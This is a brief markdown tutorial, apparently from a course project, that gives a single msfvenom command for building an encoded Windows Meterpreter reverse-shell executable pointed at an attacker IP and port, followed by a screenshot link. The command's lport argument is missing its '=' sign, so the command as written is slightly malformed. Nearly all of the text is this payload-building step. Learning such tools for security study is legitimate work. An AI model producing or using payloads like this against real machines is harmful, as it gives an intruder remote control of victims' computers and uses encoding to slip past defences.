# Creating a payload with Msfvenom

To create a Meterpreter reverse shell, execute the following command

**msfvenom -p windows/meterpreter/reverse_tcp lhost=[attacker ip] lport[attacker port] --platform windows -e x86/shikata_ga_nai -f exe -o [name of payload executable].exe**.

<img src="https://raw.githubusercontent.com/yukun2h4ng/1600final/yukun2h4ng-patch-1/images/msfvenom.png" width="800">

